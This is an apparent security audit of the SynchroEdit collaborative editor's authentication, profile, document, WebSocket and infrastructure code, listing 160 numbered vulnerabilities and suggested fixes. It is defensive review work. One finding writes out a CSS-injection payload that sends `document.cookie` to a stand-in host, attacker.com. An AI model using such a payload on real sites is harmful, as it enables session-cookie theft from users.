# Security Analysis: Login & Authentication

This document outlines 20 identified security issues, vulnerabilities, and potential improvements for the SynchroEdit login and authentication system.

## 1. User Enumeration via Username Check [FIXED]
**Solution:** Implemented constant-time responses, a Proof of Work (PoW) challenge for the API, and randomized username suggestions to prevent automated probing and timing attacks.

## 2. Weak JWT Secret Configuration [FIXED]
**Solution:** Transitioned to RS256 asymmetric signing. Replaced symmetric secrets with private/public key pairs and implemented Key ID (kid) support for secure, seamless key rotation.

## 3. Host Header Injection in Password Reset [FIXED]
**Solution:** Removed reliance on the Host header by requiring `FRONTEND_URL`. Implemented HMAC-signed URLs with dynamic salting (bound to user password hash) and one-time-use tokens.

## 4. Sensitive Information Leak in Development [FIXED]
**Solution:** Implemented unique Request Correlation IDs, structured JSON logging, and automated stack-trace hiding in development error responses.

## 5. Overly Permissive Content Security Policy (CSP) [FIXED]
**Solution:** Tightened CSP by removing third-party CDNs, implementing cryptographic nonces for both scripts and styles, and adding real-time threshold-based violation alerting.

## 6. Lack of CSRF Protection
While the application uses JWTs, the `refreshToken` is stored in an HTTP-only cookie. Without explicit CSRF protection (like anti-CSRF tokens), certain cross-site requests might still be possible if not properly guarded by `SameSite` attributes.

## 7. Auto-Login Backdoor on Localhost
The frontend `authController.js` contains a `checkAutoLogin` feature that automatically logs in the `tester` user if `autologin=true` is in the URL and the host is `localhost`. This could be exploited if a developer's local environment is accessed.

## 8. Inconsistent User Enumeration Prevention
The `signup` and `forgot-password` routes return generic messages to prevent enumeration, but the `check-username` route contradicts this by providing explicit availability status.

## 9. Rate Limiting Bypass via Proxy Spoofing
`app.set('trust proxy', 1)` is enabled. Without proper configuration of the upstream proxy (e.g., Nginx), an attacker could spoof the `X-Forwarded-For` header to bypass IP-based rate limits.

## 10. Potential for NoSQL Injection
Although `mongoSanitize` is used, complex queries in other parts of the application (outside of auth) might still be vulnerable if user input is directly used in query operators without strict schema validation.

## 11. Verification Code Brute Force
The 6-digit verification code has 1,000,000 combinations. While the rate limit is 20 requests per 15 minutes, an attacker with a large botnet of different IPs could potentially brute-force the code within its 10-minute expiry window.

## 12. Lack of Multi-Factor Authentication (MFA)
The system only relies on single-factor authentication (passwords). This is a significant risk if a user's password is compromised via phishing or reuse.

## 13. Session Eviction Vulnerability
The system limits users to 5 concurrent sessions. An attacker who has compromised a user's credentials could log in 5 times to evict the legitimate user's active session, effectively performing a Denial of Service on the account.

## 14. Plaintext Sensitive Data in Memory
While access tokens are stored in memory (which is better than `localStorage`), they are still accessible to any script running on the page (including browser extensions) via memory inspection or if XSS is achieved.

## 15. Reliance on Client-Side Password Validation
The frontend provides a rich UI for password complexity, but the ultimate security depends on the backend. If the backend regex differs or is bypassed, weak passwords could be accepted. (Currently, backend does check, but synchronization is key).

## 16. Missing Audit Logs for Security Events
The system lacks a dedicated audit log for critical security events such as password changes, email changes, and failed login attempts (beyond basic console logging).

## 17. No Account Lockout for Verification Codes
There is no mechanism to lock an account or IP after multiple failed attempts to verify an email or resend a code, leading to potential resource exhaustion or spam.

## 18. Use of `bcryptjs` over `bcrypt`
`bcryptjs` is a pure JavaScript implementation of bcrypt. While convenient and portable, it is significantly slower than the native C++ `bcrypt` library, which can affect performance under heavy load or brute-force attacks.

## 19. Insecure Transport in Development
The `secure` flag for the `refreshToken` cookie is only set when `NODE_ENV === 'production'`. In development or staging environments not using HTTPS, tokens are transmitted in plaintext over the wire.

## 20. Lack of "Account Deletion" Security
There is no mentioned process for secure account deletion, which should include revoking all sessions, deleting tokens, and ensuring all sensitive data is scrubbed from the database.

## Additional Security Issues: Create Account (Signup)

### 21. Email HTML Injection
In `email.js`, the verification email HTML is constructed using template literals with the `${code}` variable. While the code is generated as a number, if any part of the email content (like a user-provided name, though not used here yet) were included without escaping, it could lead to HTML injection in the recipient's email client.

### 22. Weak Default Password Minimum Length
The `User.js` schema defines a `minlength: 6` for passwords, whereas the controller enforces 8. If the controller check is bypassed or a new signup method is added that only relies on the schema, users could create dangerously weak passwords.

### 23. Race Condition in Signup
The `signup` process checks for an existing user and then saves the new user. Between the check and the save, another request could register the same username/email, potentially leading to database errors or unexpected behavior if unique indexes aren't perfectly handled by the driver.

### 24. Missing Email Domain Validation
The `signup` process accepts any email format that passes a basic regex. It does not validate if the domain has valid MX records, allowing users to sign up with non-existent domains, which can degrade the reputation of the email sending service (Resend/SMTP).

### 25. Sensitive Data Exposure in Logs
In `email.js`, the verification code is logged to the console in non-production environments. If these logs are captured by a centralized logging system (like CloudWatch or ELK) that is accessible to unauthorized personnel, they can hijack the signup process.

### 26. Lack of CAPTCHA on Signup
There is no CAPTCHA (like reCAPTCHA or hCaptcha) on the signup page. This makes the system highly vulnerable to automated bot registrations, which can lead to database bloat and resource exhaustion.

### 27. Improper Error Handling for Email Failures
In `email.js`, if SMTP fails, the function returns `true` anyway in some cases (to allow dev testing). In a production-like environment misconfigured as dev, this would allow users to "verify" without ever receiving a code, as long as they can guess or access the logged code.

### 28. No Limit on User-Provided Field Lengths (Bio/Profile)
While the schema has `maxlength: 500` for `bio`, other fields might not be strictly limited at the middleware level, potentially allowing for "Buffer Over-read" or "Massive Payload" attacks that strain the database or frontend rendering.

### 29. Use of Hardcoded SMTP Fallbacks
`email.js` defaults to `smtp.gmail.com` if no host is provided. Hardcoding third-party services can lead to unexpected data flow to these services if the configuration is slightly off.

### 30. Verification Code Entropy
The code is a 6-digit number generated by `crypto.randomInt`. While cryptographically secure, 1 million combinations is relatively low for a 10-minute window without aggressive per-account rate limiting (not just per-IP).

### 31. Information Leakage via `res.json(user)` (Implicit)
If the `signup` route were ever modified to return the `user` object directly, the `password` hash and `verificationCode` could be leaked. Currently, it returns specific fields, but this is a fragile pattern compared to using a `toJSON` transform.

### 32. Lack of Terms of Service / Privacy Policy Consent
The signup process does not explicitly require users to agree to a Terms of Service or Privacy Policy, which is a compliance and legal security risk (GDPR/CCPA).

### 33. No Verification Code Invalidation on Password Change
If a user changes their password during the verification phase, the old verification code might still be valid, which is a state-consistency security issue.

### 34. Potential for "Email Flooding"
An attacker can trigger the `signup` or `resend-code` endpoints repeatedly for a victim's email address, effectively flooding their inbox and potentially causing the application's email provider to ban the account for spam.

### 35. Lack of "Disposable Email" Blocking
The system allows signups from disposable email providers (e.g., Mailinator). These are often used for malicious purposes or to bypass trial limits/rate limits.

### 36. Timing Attacks on Verification
The `verifyEmail` function compares the code using `!==`. While for a 6-digit code this is hard to exploit, using `crypto.timingSafeEqual` is the standard for comparing any secret or sensitive token.

### 37. No Account Ownership Confirmation for Resend
The `resend-code` endpoint returns "If your email is registered..." regardless of whether the user is the one who initiated the signup. This can be used to probe if an email is in the pending verification state.

### 38. Missing Security Headers on Redirects
When the frontend redirects to `index.html` after successful signup, it doesn't explicitly check if the destination is local (though hardcoded here), which could be a risk if the URL were dynamic (Open Redirect).

### 39. Plaintext "isEmailVerified" modification
If the `User` model were exposed via a generic "update profile" API without strict field filtering (Mass Assignment), a user could manually set `isEmailVerified: true` without actually verifying.

### 40. Lack of IP-based Signup Throttling
The current rate limit is 10 attempts per 15 minutes for both login and signup combined. This might be too permissive for signup, allowing an attacker to create many accounts slowly but steadily from a single IP.

## Additional Security Issues: Profile & User Management

### 41. Stored XSS via Bio Field
The `bio` field in `User.js` has a `maxlength: 500` but is not sanitized on the backend before being stored. If the frontend renders this bio using `.innerHTML` (or similar) in any part of the application (e.g., in a "user profile" view or collaborator list), an attacker could inject malicious scripts.

### 42. Insecure Profile Picture Storage (Base64)
The profile picture is stored as a Base64 string directly in the MongoDB document. This can lead to "Database Bloat" and performance degradation. More importantly, if not properly validated for magic bytes, it could be used to store arbitrary malicious data.

### 43. Lack of Sensitive Action Confirmation
While the frontend `profile.js` mentions a `promptIdentityConfirmation` (which is good), the backend `updatePassword` does not require a re-authentication step (like a fresh login or a dedicated 'sudo' mode) beyond the current password. For critical changes like email or account deletion, this is essential.

### 44. Mass Assignment Vulnerability in `updateProfile`
The `updateProfile` controller in `userController.js` manually picks fields, which is safe. However, if it were changed to `Object.assign(user, req.body)`, an attacker could modify fields like `isEmailVerified` or `loginAttempts` by including them in the PUT request.

### 45. Information Leakage in `getProfile`
The `getProfile` controller returns the entire user object (minus password). This includes internal fields like `sessions` (with refresh token hashes), `verificationCode`, and `passwordResetToken`. These should be explicitly excluded from the public profile response.

### 46. Weak Password Change Logic (New vs Current)
The `updatePassword` controller does not check if the `newPassword` is the same as the `currentPassword`. Allowing users to "change" their password to the same value doesn't improve security and can bypass "password age" policies if implemented.

### 47. Insecure User Agent Parsing
The `parseUserAgent` function in `profile.js` uses simple `.includes()` checks. An attacker can easily spoof the `User-Agent` header to appear as a different device/browser, potentially misleading the user during session review.

### 48. Missing Rate Limiting on Profile Updates
The `updateProfile` route doesn't have a specific rate limiter. An attacker could potentially spam profile updates to trigger excessive database writes or log entries (Denial of Wallet/Service).

### 49. Broken Access Control on Sessions
The `revokeSession` controller relies on `req.user.id` and the `sessionId` param. It should explicitly verify that the `sessionId` being revoked actually belongs to the user making the request (though the controller currently filters by `req.user.id` in `user.sessions = user.sessions.filter(...)`, ensuring only the user's sessions are affected).

### 50. Lack of Account Export (Right to Data Portability)
Under GDPR, users have the right to export their data. The application currently has no mechanism for a user to download their full profile and history in a machine-readable format.

### 51. No "Last Password Change" Tracking
The `User` model doesn't track when the password was last changed. This prevents the implementation of security features like "Force password change after 90 days" or "Invalidate all sessions after password change".

### 52. Missing "Session Hijacking" Protection (IP Binding)
While sessions track IP addresses, they are not strictly bound. If an attacker steals a `refreshToken` and `accessToken`, they can use them from a different IP without triggering any alert or immediate invalidation (unless the user manually checks the session list).

### 53. Unprotected "Online Status" Privacy
The `showOnlineStatus` toggle in `profile.js` updates the backend, but if the WebSocket logic doesn't strictly honor this flag, other users could still potentially see when a "hidden" user is active via socket events.

### 54. Potential for CSS Injection via `accentColor`
The `accentColor` is stored as a string. If the frontend uses this value directly in a `style` attribute (e.g., `style="color: ${user.accentColor}"`) without validation, an attacker could inject CSS like `red; background: url(http://attacker.com/leak?cookie=${document.cookie})`.

### 55. Lack of "Account Activity" Notifications
Users are not notified (e.g., via email) when sensitive actions occur, such as a new login from an unrecognized device, a password change, or a session revocation.

### 56. No Minimum Password Age
There is no minimum password age, allowing users to cycle through passwords quickly to return to an old, compromised password if a "password history" policy were ever implemented.

### 57. Missing Account Lockout for Password Changes
The `updatePassword` route does not count against failed login attempts. An attacker with access to an active session could attempt to brute-force the *current* password to change it to a new one.

### 58. Reliance on Client-Side "Max Size" for PFP
`profile.js` checks for `file.size > 1024 * 1024`. This is easily bypassed by sending the request directly to the API. The backend `updateProfile` does not check the size of the `profilePicture` string before saving to MongoDB.

### 59. Insecure Session Revocation (All Others)
The `revokeAllOtherSessions` logic filters by `req.user.sessionId`. If `req.user.sessionId` is somehow missing or malformed in the middleware, it might lead to revoking *all* sessions including the current one, or none at all.

### 60. Lack of Brute-Force Protection on Identity Confirmation
The `promptIdentityConfirmation` modal on the frontend is just a UI element. If the backend doesn't implement strict rate limiting on the specific endpoint that requires this confirmation, it can be bypassed via automation.

## Document Management & Access Control (70-90)

### 61. IDOR in `addToRecent`
The `addToRecent` endpoint takes an `:id` from the URL. While it checks if the user is owner or shared, the `recentDocuments` list in the `User` model is updated blindly. If a user can guess a document ID, they can't necessarily see it, but they could potentially "pollute" their own recent list or probe for document existence via 403 vs 404.

### 62. Missing Validation on `createDocument` title
The `createDocument` controller accepts `req.body.title` without any sanitization or length limits. This could lead to XSS in document lists or database performance issues if a 1MB title is sent.

### 63. No Ownership Transfer Mechanism
There is no secure way to transfer ownership of a document. Users might share their credentials to "hand over" a project, which is a major security risk.

### 64. Improper Cleanup on `deleteDocument`
When a document is deleted, only history entries are removed. Any pending WebSocket updates or cached state in the `docs` Map might persist until a server restart or memory eviction.

### 65. Lack of "View-Only" Enforcement on History
The `getHistory` route allows anyone with `sharedWith` access to see the full history. If a user was recently added, they can see the entire history of the document before they were invited.

### 66. No Permission Revocation Logging
Revoking a user's access to a document is not logged in the `History` collection, making it impossible to audit who removed whom.

### 67. Document Title Spoofing
An attacker could create a document with a title that mimics a system notification or another user's document to trick collaborators (Homograph attack).

### 68. Over-sharing via "Recent Documents"
If a document ID is leaked, any user can add it to their `recentDocuments` list if they have ever had access, even if that access was revoked, as long as the check in `addToRecent` is only performed at the time of adding.

### 69. Missing "Private by Default" Verification
While documents are private, if the `Document` model defaults for `sharedWith` were ever changed or misconfigured, it could lead to accidental public exposure.

### 70. No Rate Limiting on Document Creation
A user can script the creation of thousands of documents, leading to database exhaustion.

## WebSocket & Real-time Security (71-100)

### 71. Weak WebSocket Authentication via Query Params
Tokens and tickets are sent in the URL query string (`?token=...`). These are often logged in plaintext by web servers, proxies, and in browser history.

### 72. Ticket Reuse Potential
While tickets are "one-time use", if the `tickets.delete(ticket)` call fails or is bypassed due to an exception before deletion, the ticket could be reused.

### 73. WebSocket "Upgrade" Denial of Service
The `server.on('upgrade', ...)` handler performs database lookups (`Document.findById`). This is an expensive operation that happens *before* the connection is fully established, allowing an attacker to spam upgrade requests to overwhelm the DB.

### 74. Awareness Protocol Spoofing
Any connected client can send `messageAwareness` updates. An attacker can broadcast fake cursor positions or user data for *other* users, leading to confusion or phishing within the editor.

### 75. Lack of Message Size Limits
There is no limit on the size of a WebSocket message. A client could send a multi-gigabyte binary update that crashes the server or consumes all available memory.

### 76. Unencrypted WebSocket (Development)
In development, `ws://` is used. If a developer tests over a public network, all document content and tokens are sent in the clear.

### 77. No Rate Limiting on WebSocket Messages
A client can send thousands of Yjs updates per second, overwhelming the server's CPU and memory, and lagging all other connected users.

### 78. Insecure Yjs State Storage
`yjsState` is stored as a Base64 string in MongoDB. Large documents with long histories can exceed the 16MB BSON limit, causing the document to become permanently unsavable or corrupt.

### 79. Lack of Client-Side Awareness Sanitization
The client-side cursor manager (not shown but implied) likely renders awareness data directly. If a user's `username` or `accentColor` (from their profile) contains malicious code, it could trigger XSS on all other collaborators' screens.

### 80. Missing Connection Heartbeat on Client
If the server's heartbeat (`interval`) terminates a client, but the client doesn't properly handle the close event, it might enter a tight reconnect loop, effectively DDoSing the server.

### 81. Global `docs` Map Memory Leak
Documents are added to the `docs` Map and only removed after 10 seconds of inactivity. If thousands of documents are opened briefly, the server's RAM will be exhausted.

### 82. Non-Constant Time Ticket Verification
`tickets.get(ticket)` is fast, but the overall verification flow (lookup, then delete, then check expiry) isn't designed to be timing-attack resistant.

### 83. Binary Protocol Obfuscation
While Yjs uses a binary protocol, it's not encrypted *within* the protocol. Anyone with access to the server memory or network traffic (if unencrypted) can reconstruct the document content.

### 84. "Read-Only" Bypass in WebSockets
The server checks `ws.readOnly` before applying updates. However, if the `syncProtocol.readSyncMessage` function has internal state changes or side effects that don't respect the `encoder` result, it might still modify the document in memory.

### 85. Lack of Origin Validation on WebSocket
The `upgrade` handler doesn't check the `Origin` header. This allows for Cross-Site WebSocket Hijacking (CSWH) if the user is authenticated via cookies (though here it's via query param, which has its own issues).

### 86. Information Leak via `notifyDocumentDeleted`
If this function broadcasts the deletion to all users, it might reveal the existence of document IDs to users who shouldn't know about them.

### 87. Insecure "Ticket" Generation entropy
`crypto.randomBytes(16)` is used, which is good. However, if the PRNG is compromised or seeded poorly (unlikely in modern Node, but possible in specific environments), tickets become guessable.

### 88. No Maximum Number of Collaborators
A document can have an unlimited number of concurrent WebSocket connections, allowing an attacker to join a document with 10,000 bots to crash the server.

### 89. Memory Management Race Condition
The `setTimeout` to delete a doc from memory might fire just as a new user is connecting, potentially leading to a "Use After Free" style logic error where the user connects to a doc that is being disposed of.

### 90. Lack of Document "Locking"
There is no "Admin Lock" to prevent all edits on a document (e.g., during a DMCA takedown or security investigation) without deleting the document.

## Database & Model Security (91-110)

### 91. Missing Index on `History.timestamp`
While it sorts by timestamp, if the index isn't created, history lookups for large documents will perform full collection scans.

### 92. No Strict Schema on `yjsState`
The `Document` model treats `yjsState` as a string/buffer. It doesn't validate if the data is actually a valid Yjs update, allowing arbitrary binary data storage.

### 93. Excessive "Lean" Usage
Using `.lean()` is great for performance but bypasses Mongoose middleware and getters/setters, which might be relied upon for security filtering in the future.

### 94. MongoDB Injection via `req.query.limit`
`parseInt(req.query.limit)` is used, which is safe. However, if any query param were used directly in a Mongoose filter, it could lead to injection.

### 95. Lack of Data Encryption at Rest
Sensitive document content is stored in plaintext (in the Yjs binary format) within MongoDB. A database compromise would expose all user documents.

### 96. "RecentDocuments" Array Bloat
There is no hard limit on the *size* of the IDs in the `recentDocuments` array at the database level, only at the controller level.

### 97. Inconsistent "Owner" Checks
Some controllers use `.toString()` to compare IDs, while others might rely on Mongoose's `.equals()`. Inconsistencies can lead to subtle bypasses.

### 98. Missing "isDeleted" Soft Delete
The application uses hard deletes (`deleteOne`). This makes it impossible to recover from accidental deletions or malicious account takeovers.

### 99. Unprotected `loginHistory` Growth
The `loginHistory` array grows to 5 items, then shifts. However, if the `unshift` and `pop` logic were ever changed, it could lead to document size limits being exceeded.

### 100. Database Connection Leak
If `mongoose.connection.readyState !== 1` checks fail to stop execution in some routes, the application might hang or leak connections trying to retry.

## Infrastructure & Environment (101-130)

### 101. Hardcoded "localhost" Fallbacks
Many utilities fall back to `localhost`. If these are triggered in production (e.g., due to missing env vars), the system will fail insecurely.

### 102. Lack of Dependency Auditing
The `package.json` includes many libraries. Without regular `npm audit` and lockfile monitoring, the project is vulnerable to supply chain attacks.

### 103. Insecure `dotenv` Usage
Loading `.env` via `require('dotenv').config()` in multiple files can lead to race conditions or inconsistent environment state.

### 104. Missing "X-Content-Type-Options: nosniff"
While Helmet is used, if it's not configured correctly for static assets, browsers might sniff MIME types and execute non-script files as scripts.

### 105. "X-Frame-Options" Misconfiguration
If the editor is intended to be embeddable, Helmet's default `SAMEORIGIN` might break features, or if it's too permissive, it allows Clickjacking.

### 106. Insecure SMTP Defaults
Falling back to Gmail SMTP for production without proper OAuth2 or App Passwords is insecure and prone to account lockout.

### 107. Missing Health Check Endpoint
Without a `/health` endpoint, orchestrators (like Kubernetes or Render) can't properly determine if the app is in a "Zombie" state (running but unable to handle requests).

### 108. Lack of Structured Logging
Logs use `logger.info` with string interpolation. This makes it difficult to parse logs for security patterns (e.g., "100 failed logins in 1 minute").

### 109. Unrestricted Outbound Traffic
If the server is compromised, it can make unrestricted outbound connections (e.g., to fetch more malware or participate in a DDoS), as there's no mention of an egress firewall.

### 110. Missing Subresource Integrity (SRI)
The `login.html` loads FontAwesome from a CDN without an `integrity` hash.

### 111. Insecure Cookie "SameSite" attribute
The `refreshToken` uses `SameSite: 'Strict'`. While secure, if the app ever needs to handle cross-origin redirects, this might be downgraded to `Lax` without a security review.

### 112. Lack of DNSSEC
There is no mention of DNS security, making the application vulnerable to DNS hijacking or spoofing.

### 113. Missing HTTP/2 or HTTP/3
Older protocols are more susceptible to certain types of DoS and header injection attacks.

### 114. Insecure "trust proxy" setting
`app.set('trust proxy', 1)` is a "magic number". If the app moves to a multi-layered proxy (e.g., Cloudflare -> Nginx -> Node), the IP used for rate limiting will be incorrect.

### 115. No Security.txt
The project lacks a `/.well-known/security.txt` file, making it harder for security researchers to report vulnerabilities responsibly.

### 116. Plaintext Secrets in `package.json`
While not present now, the lack of a "secrets management" strategy often leads to developers putting keys in scripts.

### 117. Missing "Feature-Policy" / "Permissions-Policy"
The app doesn't restrict browser features like `camera`, `microphone`, or `geolocation`, which could be exploited if an XSS vulnerability is found.

### 118. Insecure "Public" Folder Permissions
If the web server is misconfigured, it might serve the `.git` directory or other hidden files within the `public` folder.

### 119. Lack of Cache-Control on Sensitive Pages
The editor and profile pages don't explicitly set `Cache-Control: no-store`, potentially allowing sensitive content to be cached in shared proxy servers.

### 120. Missing Rate Limit on "Forgot Password"
An attacker can trigger thousands of reset emails for any user, leading to account locking or SMTP provider banning.

### 121. Insecure Default "SMTP_SECURE"
The logic `SMTP_PORT === 465` is a weak check for security. It should be explicitly configured and verified.

### 122. No "Security Headers" on WebSocket Upgrades
Standard HTTP security headers (like HSTS, CSP) are often missing from the initial 101 Switching Protocols response.

### 123. Lack of "User Account" Activity Summary
Users cannot see their full activity history (only login and doc creation), making it hard to spot suspicious changes.

### 124. Missing "Session Duration" Limits
Access tokens last 15 minutes, but there is no "Absolute Session Timeout" for the `refreshToken` (it keeps rotating forever).

### 125. Insecure "Password Reset" Token Entropy
`crypto.randomBytes(32)` is good, but the hashing with `sha256` before storage might be insufficient if the hashing salt is missing (it's not used here).

### 126. Lack of "Device Fingerprinting"
The system only uses IP and User-Agent. This is easily spoofed compared to more advanced fingerprinting techniques.

### 127. No Protection against "Replay Attacks" on Auth
The tokens don't include a "nonce" to prevent replaying a intercepted request (though HTTPS mitigates this).

### 128. Missing "Legal / Compliance" Logging
No logs for "User accepted TOS version X", which is a risk for audit compliance.

### 129. Insecure "Mock" Modules in Tests
If mock modules (`emptyModule.js`) are accidentally bundled into production, they could break security features.

### 130. Lack of "System-Wide" Emergency Stop
There is no "Kill Switch" to put the entire application into maintenance mode if a major breach is detected.

## Client-Side & UI Security (131-160)

### 131. Insecure "Autologin" logic (Hardcoded user)
The `authController.js` has `userField.value = 'tester'`. If this code is accidentally left in production, it's a massive security hole.

### 132. Lack of "XSS" protection on Error Messages
`msg.textContent = '✗ ' + message;` is used, which is safe. But if `innerHTML` were used, it would be a vulnerability.

### 133. Plaintext "Token" in LocalStorage cleanup
`localStorage.removeItem('synchroEditToken');` shows that the app used to store tokens insecurely, and legacy tokens might still be lying around.

### 134. Missing "CSRF" on Logout
The logout route is a POST but doesn't require a CSRF token. An attacker could force-log-out a user by tricking them into clicking a link (though it's a POST, it can be done via a hidden form).

### 135. Insecure "FileReader" usage
`reader.readAsDataURL(file)` for PFPs. If the resulting string is not validated on the server, it could contain anything.

### 136. Lack of "Password Input" protection
`input.type = isPassword ? 'text' : 'password';`. If a user leaves their screen, their password might be visible if someone toggles the eye icon.

### 137. Missing "Autocompletion" Security
`autocomplete="off"` is used in some places, but "current-password" should ideally be "new-password" or vice versa depending on the context to avoid browser credential leakage.

### 138. Insecure "Initials" generation
`this.getInitials(this.user.username)`. If `username` is carefully crafted, it might break the UI or layout.

### 139. Lack of "Visual Integrity" on PFP
No check to see if the PFP is actually an image and not a malicious payload disguised as a Base64 image.

### 140. Missing "Paste" Sanitization
In the editor (Quill), pasting malicious HTML or scripts could bypass Yjs sync and execute on other clients' machines.

### 141. Insecure "Debounce" for Color Sync
The `accentColor` sync happens after 1 second. If the user closes the tab before the sync, the state becomes inconsistent.

### 142. Lack of "Session Expiry" UI Notification
Users are not notified when their session is about to expire or has been revoked by another device.

### 143. Insecure "Redirect" Overlay
The overlay is purely visual. If an attacker can stop the JS execution, they might bypass the "Loading" state and see partially rendered sensitive data.

### 144. Missing "Resource Integrity" for CSS
External CSS from CDNs doesn't have `integrity` attributes.

### 145. Insecure "URL Parameter" usage in Auth
`new URLSearchParams(window.location.search).get('doc')` is used for redirection. If not validated, it could lead to Open Redirect.

### 146. Lack of "Input Sanitization" on Profile Fields
Bio and Username are not sanitized on the client before being sent to the server.

### 147. Missing "Confirmation" for Session Revocation
While `confirm()` is used, it's a native browser feature that can be suppressed or bypassed.

### 148. Insecure "UserAgent" Parsing UI
The UI shows "Windows • Chrome". If an attacker spoofs a UserAgent with `<script>`, it might execute if not handled as `textContent`.

### 149. Lack of "CSP" for inline styles
The app uses many inline styles, making it impossible to use a strict `style-src 'self'` CSP.

### 150. Missing "Audit" for Profile Changes
No way for a user to see *when* they changed their bio or PFP.

### 151. Insecure "Password Strength" logic
The score is 0-4. A "4" can still be a relatively weak password (e.g., "Abcdef1!").

### 152. Lack of "Account recovery" complexity
The forgot password flow is simple. If the user's email is compromised, the account is lost instantly with no secondary recovery method.

### 153. Missing "Branding" protection
An attacker could clone the UI easily because all assets are public and the logic is transparent.

### 154. Insecure "Verification Badge" rendering
If the `isEmailVerified` flag is tampered with in memory, the UI will show "Verified" even if it's not.

### 155. Lack of "Content Security Policy" for WebSockets
CSP should include `connect-src` to prevent the app from connecting to malicious WebSocket servers.

### 156. Missing "HSTS" Max-Age
If not set to a long duration, browsers might downgrade to HTTP after the initial visit.

### 157. Insecure "JSON" Parsing
`await response.json()` doesn't have a size limit. A massive JSON response could crash the browser tab.

### 158. Lack of "Clickjacking" protection on the Editor
If the editor can be iframed, an attacker can trick users into deleting documents or changing permissions.

### 159. Missing "Dead Man's Switch" for Sessions
If the server crashes, all in-memory tickets are lost, but sessions persist, potentially leading to a "split-brain" auth state.

### 160. Lack of "Documentation" for Security Procedures
No guide for developers on how to add new features securely, leading to future vulnerabilities.
